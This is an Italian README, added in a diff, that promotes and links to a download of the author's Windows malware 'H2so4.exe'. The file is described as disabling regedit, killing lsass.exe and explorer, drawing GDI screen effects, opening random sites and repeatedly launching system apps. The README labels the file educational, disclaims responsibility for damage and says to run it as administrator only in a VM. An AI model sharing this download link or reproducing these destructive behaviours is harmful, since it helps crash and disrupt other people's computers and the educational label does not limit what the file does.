@@ -1,0 +1,15 @@
+HO AGGIORNATO IL MIO MALWARE (H2so4.exe) , ho aggiunto che disattiva il regedit e taskill di Isass.exe.
+H2SO4 è un malware scritto in python SOLO A SCOPO EDUCATIVO. ECCO IL LINK PER IL DOWNLOAD PS SU GITHUB NON RIESCO A CARICARE IL FILE :( DATO IL SUO PESO.
+https://mega.nz/file/smVyCJjD#oFyMORfrSFl-jTlNuw_6AxVoFj1E4P1JcLDYIQr4DxI
+ABBIAMO EFFETTI AUDIO,QUADRATI GDI :
+![Screenshot 2024-04-29 174354](https://github.com/MATTIAloyoutuber/H2so4.exe/assets/164758246/e0e66ca2-d54b-4cc3-9ab9-786dca955811)
+TASKILL DELL EXPLORER,ALTRI GDI , APERTURA DI SITI RANDOM
+![Screenshot 2024-04-29 174343](https://github.com/MATTIAloyoutuber/H2so4.exe/assets/164758246/87969a3e-3064-4f4c-bc02-119face9db6c)
+APRE 20 VOLTE APP COME L EXPLORER,EDGE,PANNELLO DI CONTROLLO ECC..
+![Screenshot 2024-04-29 174524](https://github.com/MATTIAloyoutuber/H2so4.exe/assets/164758246/fb45d2ba-e546-4a56-b34f-73cc4ca154b3)
+![Screenshot 2024-04-29 174633](https://github.com/MATTIAloyoutuber/H2so4.exe/assets/164758246/d29b0e22-3b82-43b8-b37b-8872ca05f040)
+GDI E APERTURA RANDOM DI APP :
+![Screenshot 2024-04-29 174656](https://github.com/MATTIAloyoutuber/H2so4.exe/assets/164758246/9a26bbb1-ba05-4333-80c3-0dba9dd62e43)
+(CONSIGLIO: ALMENO 3 GB DI RAM E 4 CORE)
+NON SONO RESPONSABILE IN CASO DI DANNI CAUSATI ⚠️⚠️⚠️.
+PS ESEGUITE IL FILE COME AMMINISTRATORE SOLO SU VM ⚠️⚠️.
